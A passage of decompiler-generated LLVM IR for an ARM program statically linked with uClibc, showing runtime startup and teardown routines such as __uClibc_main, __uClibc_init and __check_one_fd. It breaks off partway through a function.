  br i1 %v9_14dd431, label %dec_label_pc_14ddc, label %dec_label_pc_14df4

dec_label_pc_14ddc:                               ; preds = %dec_label_pc_14dc0, %dec_label_pc_14ddc.dec_label_pc_14dd0_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_14dec = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14dec, label %dec_label_pc_14df0, label %dec_label_pc_14ddc.dec_label_pc_14dd0_crit_edge

dec_label_pc_14ddc.dec_label_pc_14dd0_crit_edge:  ; preds = %dec_label_pc_14ddc
  %v0_14dd0.pre = load i32, i32* @r2, align 4
  %v1_14dd4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14dd0 = inttoptr i32 %v0_14dd0.pre to i32*
  %v2_14dd0 = load i32, i32* %v1_14dd0, align 4
  %v3_14dd4 = icmp uge i32 %v2_14dd0, %v1_14dd4.pre
  store i1 %v3_14dd4, i1* %cpsr_c.global-to-local, align 1
  %v9_14dd4 = icmp eq i32 %v2_14dd0, %v1_14dd4.pre
  br i1 %v9_14dd4, label %dec_label_pc_14ddc, label %dec_label_pc_14df4

dec_label_pc_14df0:                               ; preds = %dec_label_pc_14ddc
  %v0_14df0 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14df4

dec_label_pc_14df4:                               ; preds = %dec_label_pc_14dc0, %dec_label_pc_14ddc.dec_label_pc_14dd0_crit_edge, %dec_label_pc_14df0
  %v0_14df4 = phi i32 [ %v0_14df0, %dec_label_pc_14df0 ], [ %v2_14dd023, %dec_label_pc_14dc0 ], [ %v2_14dd0, %dec_label_pc_14ddc.dec_label_pc_14dd0_crit_edge ]
  %v1_14df4 = phi i32 [ %v0_14df0, %dec_label_pc_14df0 ], [ %v3_14dc0, %dec_label_pc_14dc0 ], [ %v1_14dd4.pre, %dec_label_pc_14ddc.dec_label_pc_14dd0_crit_edge ]
  %v3_14df4 = icmp uge i32 %v0_14df4, %v1_14df4
  store i1 %v3_14df4, i1* %cpsr_c.global-to-local, align 1
  %v9_14df4 = icmp eq i32 %v0_14df4, %v1_14df4
  br i1 %v9_14df4, label %dec_label_pc_14dfc, label %dec_label_pc_14df4.dec_label_pc_14dc0_crit_edge

dec_label_pc_14df4.dec_label_pc_14dc0_crit_edge:  ; preds = %dec_label_pc_14df4
  %v0_14dc4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14dc0

dec_label_pc_14dfc:                               ; preds = %dec_label_pc_14df4
  store i32 116, i32* @r3, align 4
  %v0_14e04 = load i32, i32* %r8.global-to-local, align 4
  %v2_14e04 = add i32 %v0_14e04, 116
  %v3_14e04 = inttoptr i32 %v2_14e04 to i32*
  %v4_14e04 = load i32, i32* %v3_14e04, align 4
  store i32 %v4_14e04, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_14e04)
  %v0_14e10.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14e10

dec_label_pc_14e10:                               ; preds = %entry, %bb, %dec_label_pc_14da8, %dec_label_pc_14dfc
  %v0_14e10 = phi i32 [ %v1_14da0, %dec_label_pc_14da8 ], [ %v0_14e10.pre, %dec_label_pc_14dfc ], [ %v3_14d54, %entry ], [ %v1_14da0, %bb ]
  %v2_14e14 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_14e14, i32* @r4, align 4
  ret i32 %v0_14e10

; uselistorder directives
  uselistorder i32 %v0_14df0, { 1, 0 }
  uselistorder i32 %v1_14dd4.pre, { 0, 2, 1 }
  uselistorder i32 %v1_14d60, { 1, 2, 0 }
  uselistorder i32 %v1_14d9c, { 1, 0 }
  uselistorder i32 %v1_14da0, { 0, 1, 4, 3, 5, 6, 7, 2 }
  uselistorder i32 %v1_14d7c.pre, { 1, 0 }
  uselistorder i32 %v0_14d7450, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 5, 4, 0, 6, 10, 7, 9, 8, 2, 1 }
  uselistorder i32 -1036, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14e10, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_14df4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14ddc, { 1, 0 }
  uselistorder label %dec_label_pc_14d9c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14d84, { 1, 0 }
  uselistorder label %dec_label_pc_14d6c, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutex_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v3_14e34 = add i32 %tmp, 4
  %v4_14e34 = inttoptr i32 %v3_14e34 to i32*
  store i32 %arg3, i32* %v4_14e34, align 4
  ret i32 %tmp
}

define i32 @_pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_14e40 = icmp eq i32 %arg2, 0
  br i1 %v2_14e40, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v3_14e58 = call i32 @__libc_errno()
  ret i32 %v3_14e58

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
dec_label_pc_14e8c.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_14e68 = load i32, i32* @r4, align 4
  store i32 %v3_14e68, i32* %stack_var_-16, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* %r5.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 -8), i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14e8c

dec_label_pc_14e8c:                               ; preds = %dec_label_pc_14e8c.dec_label_pc_14e8c_crit_edge, %dec_label_pc_14e8c.lr.ph
  %v1_14e8c = phi i32 [ %v1_14e98, %dec_label_pc_14e8c.dec_label_pc_14e8c_crit_edge ], [ 0, %dec_label_pc_14e8c.lr.ph ]
  %v0_14e8c = phi i32 [ %v0_14e8c.pre, %dec_label_pc_14e8c.dec_label_pc_14e8c_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 -8), %dec_label_pc_14e8c.lr.ph ]
  %v4_14e8c = mul i32 %v1_14e8c, 4
  %v5_14e8c = add i32 %v4_14e8c, %v0_14e8c
  %v6_14e8c = inttoptr i32 %v5_14e8c to i32*
  %v7_14e8c = load i32, i32* %v6_14e8c, align 4
  call void @__pseudo_branch(i32 %v7_14e8c)
  %v0_14e98 = load i32, i32* %r4.global-to-local, align 4
  %v1_14e98 = add i32 %v0_14e98, -1
  store i32 %v1_14e98, i32* %r4.global-to-local, align 4
  %v2_14e98 = icmp eq i32 %v0_14e98, 0
  br i1 %v2_14e98, label %dec_label_pc_14ea0, label %dec_label_pc_14e8c.dec_label_pc_14e8c_crit_edge

dec_label_pc_14e8c.dec_label_pc_14e8c_crit_edge:  ; preds = %dec_label_pc_14e8c
  %v0_14e8c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14e8c

dec_label_pc_14ea0:                               ; preds = %dec_label_pc_14e8c
  %v0_14ea4.pre = load i32, i32* %r5.global-to-local, align 4
  %v2_14ea4 = add i32 %v0_14ea4.pre, 2004
  %v3_14ea4 = inttoptr i32 %v2_14ea4 to i32*
  %v4_14ea4 = load i32, i32* %v3_14ea4, align 4
  %v2_14ea8 = icmp eq i32 %v4_14ea4, 0
  br i1 %v2_14ea8, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_14ea0
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_14ea0, %bb
  %v2_14eb0 = xor i1 %v2_14ea8, true
  call void @__pseudo_cond_branch(i1 %v2_14eb0, i32 %v4_14ea4)
  %v0_14eb8 = load i32, i32* %r5.global-to-local, align 4
  %v2_14eb8 = add i32 %v0_14eb8, 2008
  %v3_14eb8 = inttoptr i32 %v2_14eb8 to i32*
  %v4_14eb8 = load i32, i32* %v3_14eb8, align 4
  %v2_14ebc = icmp eq i32 %v4_14eb8, 0
  br i1 %v2_14ebc, label %bb19, label %bb18

bb18:                                             ; preds = %bb17
  br label %bb19

bb19:                                             ; preds = %bb17, %bb18
  %v2_14ec4 = xor i1 %v2_14ebc, true
  call void @__pseudo_cond_branch(i1 %v2_14ec4, i32 %v4_14eb8)
  %v2_14ec8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14ec8, i32* %r4.global-to-local, align 4
  %v1_14ecc = load i32, i32* @r0, align 4
  ret i32 %v1_14ecc

; uselistorder directives
  uselistorder i32 %v1_14e98, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_14ee4 = load i32, i32* @r4, align 4
  %v6_14ee4 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_14ef8 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v3_14f00 = icmp eq i32 %v2_14ef8, -1
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* @r3, align 4
  br i1 %v3_14f00, label %dec_label_pc_14f0c, label %dec_label_pc_14f24

dec_label_pc_14f0c:                               ; preds = %entry
  %v0_14f10 = load i32, i32* @r5, align 4
  %v2_14f18 = call i32 @__libc_open(i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 -33916), i32 %v0_14f10)
  %v1_14f1c = load i32, i32* @r4, align 4
  %v1_14f20 = icmp ne i32 %v2_14f18, %v1_14f1c
  call void @__pseudo_cond_branch(i1 %v1_14f20, i32 ptrtoint (i32* @global_var_13848.559 to i32))
  br label %dec_label_pc_14f24

dec_label_pc_14f24:                               ; preds = %entry, %dec_label_pc_14f0c
  %v1_14f2c = phi i32 [ %v2_14ef8, %entry ], [ %v2_14f18, %dec_label_pc_14f0c ]
  store i32 %v3_14ee4, i32* @r4, align 4
  store i32 %v6_14ee4, i32* @r5, align 4
  ret i32 %v1_14f2c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_14f24, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14f38 = load i32, i32* @r4, align 4
  store i32 %v3_14f38, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* %r4.global-to-local, align 4
  %v4_14f48 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 148) to i32*), align 4
  %v1_14f4c = inttoptr i32 %v4_14f48 to i32*
  %v2_14f4c = load i32, i32* %v1_14f4c, align 4
  %v2_14f50 = icmp eq i32 %v2_14f4c, 0
  br i1 %v2_14f50, label %dec_label_pc_14f58, label %dec_label_pc_14f7c

dec_label_pc_14f58:                               ; preds = %entry
  store i32 4096, i32* %v1_14f4c, align 4
  %v0_14f60 = call i32 @__pthread_initialize_minimal()
  %v0_14f68 = load i32, i32* %r4.global-to-local, align 4
  %v2_14f68 = add i32 %v0_14f68, -47936
  %v2_14f70 = icmp eq i32 %v2_14f68, 0
  br i1 %v2_14f70, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_14f58
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_14f58, %bb
  %v2_14f78 = xor i1 %v2_14f70, true
  call void @__pseudo_cond_branch(i1 %v2_14f78, i32 %v2_14f68)
  %v2_14f7c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14f7c

dec_label_pc_14f7c:                               ; preds = %entry, %bb4
  %v2_14f7c = phi i32 [ %v2_14f7c.pre, %bb4 ], [ %v3_14f38, %entry ]
  %.0 = phi i32 [ %v0_14f60, %bb4 ], [ undef, %entry ]
  store i32 %v2_14f7c, i32* %r4.global-to-local, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder label %dec_label_pc_14f7c, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp62 = call i32 @__decompiler_undefined_function_0()
  %tmp63 = call i32 @__decompiler_undefined_function_0()
  %tmp64 = call i32 @__decompiler_undefined_function_0()
  %tmp65 = call i32 @__decompiler_undefined_function_0()
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-400 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-416 = alloca i32, align 4
  store i32 53908, i32* %r4.global-to-local, align 4
  %v1_14f9c = add i32 %tmp, 4
  store i32 %v1_14f9c, i32* %ip.global-to-local, align 4
  %v2_14fa0 = load i32, i32* %arg3, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* %r4.global-to-local, align 4
  %v3_14fac = mul i32 %arg2, 4
  store i32 %v3_14fac, i32* @r7, align 4
  %v4_14fb4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 24) to i32*), align 4
  store i32 %v4_14fb4, i32* %r1.global-to-local, align 4
  store i32 56, i32* %r2.global-to-local, align 4
  %v2_14fbc = add i32 %v1_14f9c, %v3_14fac
  store i32 %v2_14fbc, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* %stack_var_-416, align 4
  %v4_14fc4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 56) to i32*), align 4
  store i32 %v4_14fc4, i32* %r4.global-to-local, align 4
  %v3_14fc8 = icmp uge i32 %v2_14fbc, %v2_14fa0
  store i1 %v3_14fc8, i1* %cpsr_c.global-to-local, align 1
  %v9_14fc8 = icmp eq i32 %v2_14fbc, %v2_14fa0
  store i1 %v9_14fc8, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg7, i32* %r2.global-to-local, align 4
  %v2_14fd0 = inttoptr i32 %v4_14fc4 to i32*
  store i32 %v2_14fbc, i32* %v2_14fd0, align 4
  br i1 %v9_14fc8, label %bb, label %bb75

bb:                                               ; preds = %entry
  store i32 %tmp, i32* %ip.global-to-local, align 4
  br label %bb75

bb75:                                             ; preds = %entry, %bb
  %v0_14fd8 = load i32, i32* %r2.global-to-local, align 4
  %v1_14fd8 = load i32, i32* %r1.global-to-local, align 4
  %v2_14fd8 = inttoptr i32 %v1_14fd8 to i32*
  store i32 %v0_14fd8, i32* %v2_14fd8, align 4
  %v2_14fdc = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_14fdc, i32* %r5.global-to-local, align 4
  store i32 %arg6, i32* %r1.global-to-local, align 4
  store i32 2008, i32* %r2.global-to-local, align 4
  %v0_14fe8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_14fe8, i32* @r6, align 4
  br i1 %v9_14fc8, label %bb76, label %.thread52

.thread52:                                        ; preds = %bb75
  %v3_14ff053 = add i32 %v2_14fdc, 2008
  %v4_14ff054 = inttoptr i32 %v3_14ff053 to i32*
  store i32 %arg6, i32* %v4_14ff054, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %bb77

bb76:                                             ; preds = %bb75
  %v1_14fec = load i32, i32* %ip.global-to-local, align 4
  %v2_14fec = load i32, i32* @r7, align 4
  %v3_14fec = add i32 %v2_14fec, %v1_14fec
  store i32 %v3_14fec, i32* %r3.global-to-local, align 4
  %v3_14ff050 = add i32 %v2_14fdc, 2008
  %v4_14ff051 = inttoptr i32 %v3_14ff050 to i32*
  store i32 %arg6, i32* %v4_14ff051, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_14ffc = load i32, i32* %r3.global-to-local, align 4
  %v2_14ffc = load i32, i32* %r4.global-to-local, align 4
  %v3_14ffc = inttoptr i32 %v2_14ffc to i32*
  store i32 %v1_14ffc, i32* %v3_14ffc, align 4
  br label %bb77

bb77:                                             ; preds = %.thread52, %bb76
  %v2_15000 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_15000, i32* %r0.global-to-local, align 4
  store i32 120, i32* %r2.global-to-local, align 4
  %v3_15008 = bitcast i32* %stack_var_-120 to i8*
  %v4_15008 = call i32 @__GI_memset(i8* %v3_15008, i32 0, i32 120)
  store i32 %v4_15008, i32* %r0.global-to-local, align 4
  %v0_1500c = load i32, i32* %r4.global-to-local, align 4
  %v1_1500c = inttoptr i32 %v0_1500c to i32*
  %v2_1500c = load i32, i32* %v1_1500c, align 4
  br label %dec_label_pc_15018

dec_label_pc_15018:                               ; preds = %dec_label_pc_15018, %bb77
  %storemerge = phi i32 [ %v2_1500c, %bb77 ], [ %v1_15024, %dec_label_pc_15018 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_15018 = inttoptr i32 %storemerge to i32*
  %v2_15018 = load i32, i32* %v1_15018, align 4
  store i32 %v2_15018, i32* %r3.global-to-local, align 4
  %v2_1501c = icmp eq i32 %v2_15018, 0
  %v1_15024 = add i32 %storemerge, 4
  br i1 %v2_1501c, label %dec_label_pc_15024, label %dec_label_pc_15018

dec_label_pc_15024:                               ; preds = %dec_label_pc_15018
  store i32 %v1_15024, i32* @r4, align 4
  store i32 %v2_15000, i32* @r5, align 4
  %v1_1504830 = inttoptr i32 %v1_15024 to i32*
  %v2_1504831 = load i32, i32* %v1_1504830, align 4
  store i32 %v2_1504831, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1504c33 = icmp eq i32 %v2_1504831, 0
  store i1 %v2_1504c33, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1504c33, label %dec_label_pc_15054, label %dec_label_pc_15030

dec_label_pc_15030:                               ; preds = %dec_label_pc_15024, %dec_label_pc_15048
  %v4_15038 = phi i32 [ %v1_15044, %dec_label_pc_15048 ], [ %v1_15024, %dec_label_pc_15024 ]
  %v5_15034 = phi i32 [ %v2_15048, %dec_label_pc_15048 ], [ %v2_1504831, %dec_label_pc_15024 ]
  %v2_15030 = icmp ugt i32 %v5_15034, 13
  store i1 %v2_15030, i1* %cpsr_c.global-to-local, align 1
  %v7_15030 = icmp eq i32 %v5_15034, 14
  store i1 %v7_15030, i1* %cpsr_z.global-to-local, align 1
  %v2_15034 = xor i1 %v2_15030, true
  %v3_15034 = or i1 %v7_15030, %v2_15034
  br i1 %v3_15034, label %bb78, label %bb79

bb78:                                             ; preds = %dec_label_pc_15030
  %v4_15034 = load i32, i32* @r5, align 4
  %v6_15034 = and i32 %v5_15034, 536870912
  %v7_15034 = icmp ne i32 %v6_15034, 0
  store i1 %v7_15034, i1* %cpsr_c.global-to-local, align 1
  %v8_15034 = mul i32 %v5_15034, 8
  %v9_15034 = add i32 %v4_15034, %v8_15034
  store i32 %v9_15034, i32* %r0.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_15030, %bb78
  %v1_15040 = phi i1 [ %v2_15030, %dec_label_pc_15030 ], [ %v7_15034, %bb78 ]
  %v2_15038 = xor i1 %v1_15040, true
  %v3_15038 = or i1 %v7_15030, %v2_15038
  br i1 %v3_15038, label %bb80, label %dec_label_pc_15048

bb80:                                             ; preds = %bb79
  store i32 %v4_15038, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15048

dec_label_pc_15048:                               ; preds = %bb79, %bb80
  call void @__pseudo_cond_branch(i1 %v3_15038, i32 ptrtoint (i32* @global_var_11c00.567 to i32))
  %v0_15044 = load i32, i32* @r4, align 4
  %v1_15044 = add i32 %v0_15044, 8
  store i32 %v1_15044, i32* @r4, align 4
  %v1_15048 = inttoptr i32 %v1_15044 to i32*
  %v2_15048 = load i32, i32* %v1_15048, align 4
  store i32 %v2_15048, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1504c = icmp eq i32 %v2_15048, 0
  store i1 %v2_1504c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1504c, label %dec_label_pc_15054, label %dec_label_pc_15030

dec_label_pc_15054:                               ; preds = %dec_label_pc_15048, %dec_label_pc_15024
  store i32 %v2_15000, i32* %r0.global-to-local, align 4
  %v1_15058 = call i32 @_dl_aux_init(i32 %v2_15000)
  store i32 %v1_15058, i32* %r0.global-to-local, align 4
  %v1_1505c = call i32 @__GI___uClibc_init(i32 %v1_15058)
  store i32 %v1_1505c, i32* @r0, align 4
  store i32 148, i32* %r3.global-to-local, align 4
  %v2_15064 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15064, i32* @lr, align 4
  store i32 %tmp66, i32* @r2, align 4
  %v2_1506c = add i32 %v2_15064, 148
  %v3_1506c = inttoptr i32 %v2_1506c to i32*
  %v4_1506c = load i32, i32* %v3_1506c, align 4
  store i32 %v4_1506c, i32* %r1.global-to-local, align 4
  store i32 %tmp65, i32* @r3, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15074 = icmp eq i32 %tmp66, 0
  store i1 %v2_15074, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15074, label %bb81, label %bb82

bb81:                                             ; preds = %dec_label_pc_15054
  store i32 4096, i32* @r2, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_15054, %bb81
  %v0_15080 = phi i32 [ %tmp66, %dec_label_pc_15054 ], [ 4096, %bb81 ]
  %v3_1507c = icmp eq i32 %tmp65, -1
  store i1 %v3_1507c, i1* %cpsr_c.global-to-local, align 1
  %v8_1507c = icmp eq i32 %tmp65, -1
  store i1 %v8_1507c, i1* %cpsr_z.global-to-local, align 1
  %v2_15080 = inttoptr i32 %v4_1506c to i32*
  store i32 %v0_15080, i32* %v2_15080, align 4
  br i1 %v3_1507c, label %dec_label_pc_15088, label %dec_label_pc_150b0

dec_label_pc_15088:                               ; preds = %bb82
  %v0_15088 = call i32 @getuid()
  store i32 %v0_15088, i32* @r0, align 4
  store i32 %v0_15088, i32* %r4.global-to-local, align 4
  %v0_15090 = call i32 @geteuid()
  store i32 %v0_15090, i32* @r0, align 4
  %v3_15094 = icmp uge i32 %v0_15088, %v0_15090
  store i1 %v3_15094, i1* %cpsr_c.global-to-local, align 1
  %v9_15094 = icmp eq i32 %v0_15088, %v0_15090
  store i1 %v9_15094, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15094, label %dec_label_pc_1509c, label %dec_label_pc_150d8

dec_label_pc_1509c:                               ; preds = %dec_label_pc_15088
  %v1_1509c = call i32 @getgid(i32 %v0_15090)
  store i32 %v1_1509c, i32* @r0, align 4
  store i32 %v1_1509c, i32* %r4.global-to-local, align 4
  %v0_150a4 = call i32 @getegid()
  store i32 %v0_150a4, i32* %r0.global-to-local, align 4
  %v3_150a8 = icmp uge i32 %v1_1509c, %v0_150a4
  store i1 %v3_150a8, i1* %cpsr_c.global-to-local, align 1
  %v9_150a8 = icmp eq i32 %v1_1509c, %v0_150a4
  store i1 %v9_150a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_150a8, label %dec_label_pc_150b0, label %dec_label_pc_150d8

dec_label_pc_150b0:                               ; preds = %dec_label_pc_1509c, %bb82
  store i32 %tmp65, i32* @r2, align 4
  store i1 %v3_1507c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v8_1507c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1507c, label %dec_label_pc_15100, label %dec_label_pc_150bc

dec_label_pc_150bc:                               ; preds = %dec_label_pc_150b0
  store i32 %tmp64, i32* @r3, align 4
  %v3_150c0 = icmp uge i32 %tmp65, %tmp64
  store i1 %v3_150c0, i1* %cpsr_c.global-to-local, align 1
  %v9_150c0 = icmp eq i32 %tmp65, %tmp64
  store i1 %v9_150c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_150c0, label %dec_label_pc_150c8, label %dec_label_pc_150d8

dec_label_pc_150c8:                               ; preds = %dec_label_pc_150bc
  store i32 %tmp63, i32* @r2, align 4
  store i32 %tmp62, i32* @r3, align 4
  %v3_150d0 = icmp uge i32 %tmp63, %tmp62
  store i1 %v3_150d0, i1* %cpsr_c.global-to-local, align 1
  %v9_150d0 = icmp eq i32 %tmp63, %tmp62
  store i1 %v9_150d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_150d0, label %dec_label_pc_15100, label %dec_label_pc_150d8

dec_label_pc_150d8:                               ; preds = %dec_label_pc_150bc, %dec_label_pc_1509c, %dec_label_pc_15088, %dec_label_pc_150c8
  store i32 32770, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 32768, i32* %r1.global-to-local, align 4
  %v2_150e4 = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_150ec = load i32, i32* @r4, align 4
  store i32 %v0_150ec, i32* %r1.global-to-local, align 4
  %v2_150f0 = call i32 @__check_one_fd(i32 1, i32 %v0_150ec)
  %v0_150f4 = load i32, i32* @r4, align 4
  store i32 %v0_150f4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_150fc = call i32 @__check_one_fd(i32 2, i32 %v0_150f4)
  store i32 %v2_150fc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15100

dec_label_pc_15100:                               ; preds = %dec_label_pc_150c8, %dec_label_pc_150b0, %dec_label_pc_150d8
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 260, i32* %r3.global-to-local, align 4
  %v2_15108 = load i32, i32* %arg3, align 4
  store i32 %v2_15108, i32* %r2.global-to-local, align 4
  %v2_1510c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_1510c, i32* %r1.global-to-local, align 4
  %v3_15110 = add i32 %v2_1510c, 260
  %v4_15110 = inttoptr i32 %v3_15110 to i32*
  store i32 %v2_15108, i32* %v4_15110, align 4
  %v0_15114 = load i32, i32* %r0.global-to-local, align 4
  %v1_15114 = inttoptr i32 %v0_15114 to i32*
  %v2_15114 = load i32, i32* %v1_15114, align 4
  store i32 %v2_15114, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15118 = icmp eq i32 %v2_15114, 0
  store i1 %v2_15118, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15118, label %bb84, label %dec_label_pc_15120

dec_label_pc_15120:                               ; preds = %dec_label_pc_15100
  store i32 164, i32* %r3.global-to-local, align 4
  %v0_15124 = load i32, i32* %r1.global-to-local, align 4
  %v2_15124 = add i32 %v0_15124, 164
  %v3_15124 = inttoptr i32 %v2_15124 to i32*
  %v4_15124 = load i32, i32* %v3_15124, align 4
  store i32 %v4_15124, i32* %r3.global-to-local, align 4
  %v2_15128 = inttoptr i32 %v4_15124 to i32*
  store i32 %v2_15114, i32* %v2_15128, align 4
  store i32 47, i32* %r1.global-to-local, align 4
  %v0_15130 = load i32, i32* %r0.global-to-local, align 4
  %v1_15130 = inttoptr i32 %v0_15130 to i32*
  %v2_15130 = load i32, i32* %v1_15130, align 4
  store i32 %v2_15130, i32* %r0.global-to-local, align 4
  %v4_15134 = call i32 @__GI_strrchr(i32 %v2_15130, i32 47, i32 %v2_15108, i32 %v4_15124)
  store i32 %v4_15134, i32* %r0.global-to-local, align 4
  store i32 96, i32* %r3.global-to-local, align 4
  %v2_1513c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_1513c, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15140 = icmp eq i32 %v4_15134, 0
  store i1 %v2_15140, i1* %cpsr_z.global-to-local, align 1
  %v2_15144 = add i32 %v2_1513c, 96
  %v3_15144 = inttoptr i32 %v2_15144 to i32*
  %v4_15144 = load i32, i32* %v3_15144, align 4
  store i32 %v4_15144, i32* %r2.global-to-local, align 4
  br i1 %v2_15140, label %.thread57, label %bb83

.thread57:                                        ; preds = %dec_label_pc_15120
  %v2_1514c58 = inttoptr i32 %v4_15144 to i32*
  store i32 0, i32* %v2_1514c58, align 4
  br label %bb84

bb83:                                             ; preds = %dec_label_pc_15120
